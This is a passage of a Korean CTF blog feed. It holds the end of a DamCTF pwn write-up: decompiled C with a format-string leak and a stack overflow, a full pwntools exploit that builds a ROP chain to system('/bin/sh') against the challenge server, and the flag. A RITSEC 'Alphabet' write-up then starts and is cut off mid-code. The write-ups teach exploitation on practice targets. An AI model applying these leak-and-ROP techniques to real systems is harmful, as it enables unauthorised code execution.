%s.\n&quot;</span>, country, country + <span class="number">50</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I&#x27;ll let you through&quot;</span>);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>load_countries</code> Ìï®ÏàòÎäî Í∞ÑÎã®ÌïòÍ≤å Ïù¥ÏïºÍ∏∞ÌïòÎ©¥ ÏÑúÎ≤ÑÏóê ÏûàÎäî txt ÌååÏùºÏóêÏÑú countryÏôÄ capitalÏùÑ ÏùΩÏñ¥Ïò§Îäî Í≤ÉÏù¥Îã§. countryÎäî <code>country</code>Ïóê Ï†ÄÏû•ÎêòÍ≥† capitalÏùÄ <code>country + 50</code>Ïóê Ï†ÄÏû•ÎêúÎã§. Ïù¥ Îëê Í∞úÏùò Îç∞Ïù¥ÌÑ∞Î•º ÏùΩÏñ¥Ïò§Îäî txt ÌååÏùº ÎÇ¥Î∂ÄÎäî ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏÉùÍ≤ºÎã§. <code>,</code> Í∏∞Ï§ÄÏúºÎ°ú ÏûòÎùºÏÑú ÏùΩÎäîÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaa,bbbb</span><br><span class="line">cccc,dddd</span><br></pre></td></tr></table></figure><p>ÏßùÏóê ÎßûÎäî countryÏôÄ captialÏùÑ ÎßûÏ∂∞Ï£ºÎ©¥ <code>menu</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÍ≤å ÎêòÍ≥† Î≥∏Í≤©Ï†ÅÏù∏ Íµ¨ÌòÑÏù¥ ÏãúÏûëÎêúÎã§. Ï∞∏Í≥†Î°ú ÌãÄÎ¶¨Î©¥ Ï†ïÎãµÏùÑ ÏïåÎ†§Ï£ºÎãà remoteÎ°ú Î¨∏Ï†úÎ•º ÌíÄ Îïå ÏùºÎ∂ÄÎü¨ ÌãÄÎ†§ÏÑú Îç∞Ïù¥ÌÑ∞Îì§ÏùÑ Î™®ÏïÑÏÑú ÌíÄÎ©¥ ÎêúÎã§. Ìïú Î≤àÎßå ÎßûÏ∂îÎ©¥ <code>menu</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÎãà ÎßûÏ∂ú ÎïåÍπåÏßÄ Ïó∞Í≤∞ÌñàÎã§Í∞Ä ÎÅäÏñ¥Ï£ºÍ≥† ÌïòÎ©¥ ÎêúÎã§.</p><p><code>menu</code> Ìï®ÏàòÎ•º Î≥¥Î©¥ 5 Í∞ÄÏßÄ Í∏∞Îä•Ïù¥ ÏûàÍ≥† Í∞Å Í∏∞Îä•ÏùÑ ÏÇ¥Ìé¥Î¥êÏïº ÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( choice )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    read_book();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    watch_movie(fsb);                       <span class="comment">// leak something</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">    review();                               <span class="comment">// put payload</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Sad to see you go.&quot;</span>);             <span class="comment">// bof</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could I get your name for my records?&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">48uLL</span>);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">    (fsb);                         <span class="comment">// read(0, fsb, 0x12CuLL);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï£ºÏÑùÏóê Ï†ÅÌûåÎåÄÎ°ú <code>watch_movie</code> Ìï®ÏàòÏóêÏÑúÎäî ÏâΩÍ≤å <code>printf(buf)</code>Î°ú Ïù∏Ìï¥ ÎåÄÎÜìÍ≥† FSBÍ∞Ä Î∞úÏÉùÌïúÎã§. ÏûÖÎ†•ÏùÄ 5Î≤à Î©îÎâ¥Ïù∏ <code>add_movie</code> Ìï®ÏàòÏóêÏÑú ÏïÑÎûòÏôÄ Í∞ôÏù¥ Ïù¥Î§ÑÏßÑÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">add_movie</span><span class="params">(<span class="type">void</span> *fsb)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your movie link here and I&#x27;ll add it to the list&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, fsb, <span class="number">0x12C</span>uLL);</span><br><span class="line">  result = <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)fsb, <span class="string">&quot;%n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>n</code>Ïù¥ ÌïÑÌÑ∞ÎßÅÎêòÏñ¥ ÏûàÏñ¥ÏÑú <code>p</code>Î•º ÏÇ¨Ïö©Ìï¥ÏÑú Ï£ºÏÜå leakÎßå Ìï† Ïàò ÏûàÎã§.</p><p>ÌïúÌé∏, 4Î≤à Î©îÎâ¥ÏóêÏÑ† BOFÍ∞Ä Î∞úÏÉùÌïòÎäîÎç∞ Î≤ÑÌçºÏùò ÏúÑÏπòÍ∞Ä ÏïÑÎûòÏôÄ Í∞ôÏïÑÏÑú Ï†ïÎßê ÏïÑÏä¨ÌïòÍ≤å Ïò§Î≤ÑÌîåÎ°úÏö∞Í∞Ä Î∞úÏÉùÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf[32]; // [rsp+130h] [rbp-20h] BYREF</span><br></pre></td></tr></table></figure><p>ÎåÄÏã† <code>review</code> Ìï®ÏàòÎ•º Î≥¥Î©¥ ÏïÑÏ£º ÎÑâÎÑâÌïòÍ≤å Î≥ÄÏàòÏóêÎã§Í∞Ä ÏûÖÎ†•ÏùÑ Î∞õÍ≥† ÏûàÏúºÎØÄÎ°ú Ïó¨Í∏∞Îã§Í∞Ä payloadÎ•º Ï†ÄÏû•ÏãúÏºú ÎÜìÍ≥† ÌùêÎ¶ÑÏùÑ Î∞îÍæ∏Î©¥ Îê† Í≤É Í∞ôÎã§!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">review</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">1008</span>]; <span class="comment">// [rsp+0h] [rbp-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+3F0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is the name of the book/movie you would like to review?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">59uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okay, write your review below:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">1000uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thanks! I&#x27;ll make sure to take note of this review.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>captital ÏßàÎ¨∏ ÎßûÏ∂îÍ∏∞</li><li><code>add_movie</code> Ìï®ÏàòÏôÄ <code>watch_movie</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ FSBÎ•º Ïù¥Ïö©ÌïòÏó¨ leak stack, libc address</li><li><code>review</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ <code>system</code> Ìï®Ïàò Ïã§ÌñâÌïòÎäî rop payload ÏûÖÎ†•</li><li>4Î≤à Î©îÎâ¥Î•º ÌÜµÌï¥ ÌùêÎ¶ÑÏùÑ rop payloadÍ∞Ä Ï†ÄÏû•Îêú Ïä§ÌÉùÏúºÎ°ú Î≥ÄÍ≤Ω</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;capital of &#x27;</span>)</span><br><span class="line">    country = p.recvline()</span><br><span class="line">    country = country[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if country == b&#x27;aaaa&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;bbbb&#x27;)</span></span><br><span class="line">    <span class="comment"># if country == b&#x27;cccc&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;dddd&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Italy&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Rome&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Australia&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Canberra&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Ireland&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dublin&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Jordan&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Amman&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Sweden&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Stockholm&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;India&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Delhi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Egypt&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Cairo&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Tanzania&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dodoma&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Lebanon&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Beirut&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Kenya&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Nairobi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Denmark&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Copenhagen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Peru&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Lima&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    text = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Incorrect.&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack : &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x580</span></span><br><span class="line">info(<span class="string">&#x27;pie : &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%45$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) -<span class="number">0x5902a</span>  - <span class="number">0x28000</span></span><br><span class="line">info(<span class="string">&#x27;libc : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># put payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;review?\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;below:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># control rip</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x440</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x562ec</span>) <span class="comment"># leave ret</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;records?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dam&#123;my_f4v0r173_15_bl4d3_runn3r_b1n6b0n6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - Alphabet (oob read, write)</title>
      <link href="/230412-ritsecctf2023-3Alphabet/"/>
      <url>/230412-ritsecctf2023-3Alphabet/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>This new protocol let‚Äôs you update the official English alphabet in real time! Easy as A#_<br><code>nc alphabet.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 500 points]</li></ul><p>Ïõ¨ÎßåÌïú Ïî®ÌÖùÏùÄ Ï∑®ÏïΩÏ†ê Ï∞æÎäî Í≤ÉÎ≥¥Îã§ ÏùµÏä§Í∞Ä Ìõ®Ïî¨ Îçî Ïñ¥Î†§Ïö¥ Í≤É Í∞ôÎã§.. „Ö†„Ö† Ïù¥ Î¨∏Ï†úÍ∞Ä Í∑ºÎûò ÌíÄÏñ¥Î≥∏ Î¨∏Ï†ú Ï§ëÏóê ÏùµÏä§Í∞Ä Í∞ÄÏû• ÌûòÎì§Í≥† Ïñ¥Î†§Ïõ†Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î®ºÏ†Ä <code>main</code> Ìï®ÏàòÏù¥Îã§.</p><p>Ï∞∏Í≥†Î°ú seccompÏù¥ ÏûàÏñ¥ÏÑú ÌôïÏù∏Ìï¥Ïïº ÌïúÎã§. ÎåÄÏ∂© <code>flag.txt orw</code>Ìï¥ÏïºÌïòÍ≥† <code>mprotect</code> Ìï®ÏàòÍ∞Ä ÌóàÏö©ÎêòÏñ¥ ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seccomp_rules();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">puts</span><span class="params">(<span class="string">&quot;Running very important code and threads&quot;</span>)</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !fgets(buf, <span class="number">0x2D</span>, <span class="built_in">stdin</span>) );         <span class="comment">// fgets@got -&gt; gets</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt; <span class="number">44</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = i;</span><br><span class="line">LABEL_8:</span><br><span class="line">    buf[v3] = <span class="number">0</span>;</span><br><span class="line">    use_packet(buf, v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Scrambled alphabet sent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï£ºÏÑùÏùÄ ÏùµÏä§ÏôÄ Í¥ÄÎ†®ÎêúÍ±¥Îç∞.. ÏùºÎã® Î¨¥ÏãúÌïòÍ≥† ÏΩîÎìú Î∂ÑÏÑùÏùÑ Ìï¥Î≥¥Ïûê. <code>fgets</code> Ìï®ÏàòÎ°ú 0x2D ÌÅ¨Í∏∞ÎßåÌÅº <code>buf</code>Ïóê ÏûÖÎ†•ÏùÑ Î∞õÏïÑÏÑú Ïò§Î≤ÑÌîåÎ°úÏö∞Îäî ÏùºÏñ¥ÎÇòÏßÄ ÏïäÎäîÎã§. <code>\n</code>Ïù¥ Ïò§Î©¥ <code>break</code>ÌïòÍ≥† ÏûÖÎ†•Ìïú sizeÏôÄ Ìï®Íªò <code>use_packet</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïúÎã§. sizeÍ∞Ä 44Î≥¥Îã§ ÌÅ¨Î©¥ <code>v3</code> Î≥ÄÏàòÍ∞Ä Ï†ïÏùòÎêòÏßÄ ÏïäÏúºÎãà Ï°∞Ïã¨ÌïòÏûê. ÏùµÏä§Ìï† Îïå <code>fgets@got</code>Î•º <code>gets</code>Ìï®ÏàòÎ°ú ÎçÆÏóàÏóàÎäîÎç∞ <code>v3</code> Î≥ÄÏàòÍ∞Ä Ï†ïÏùòÎêòÏßÄ ÏïäÏïÑ ÏùµÏä§ ÏΩîÎìúÏóêÏÑú ÏñµÏßÄÎ°ú Ï†ïÏùòÌï¥Ï§¨Îã§.</p><p><code>use_packet</code> Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">use_packet</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 idx1; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 idx2; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Using 